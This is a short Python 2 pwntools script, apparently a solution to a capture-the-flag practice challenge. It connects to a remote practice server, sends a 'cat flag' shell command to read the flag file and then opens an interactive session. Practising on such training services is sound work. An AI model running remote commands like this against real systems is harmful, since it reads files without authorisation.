#!/usr/bin/env python2

from pwn import *

p = remote('hackme.inndy.tw', 7709)
p.sendline('cat flag')
p.interactive()
p.close()
